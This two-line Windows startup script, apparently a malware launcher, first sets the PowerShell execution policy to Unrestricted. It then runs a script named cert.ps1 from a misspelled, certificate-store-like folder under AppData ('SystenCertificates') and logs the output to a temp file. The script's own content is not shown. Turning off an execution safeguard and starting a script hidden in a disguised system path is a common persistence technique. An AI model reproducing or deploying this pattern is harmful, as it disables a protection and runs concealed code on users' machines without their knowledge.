PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 2>&1
PowerShell %AppData%\Microsoft\Windows\SystenCertificates\My\Certificates\cert.ps1 >> "%TEMP%\StartupLog.txt" 2>&1
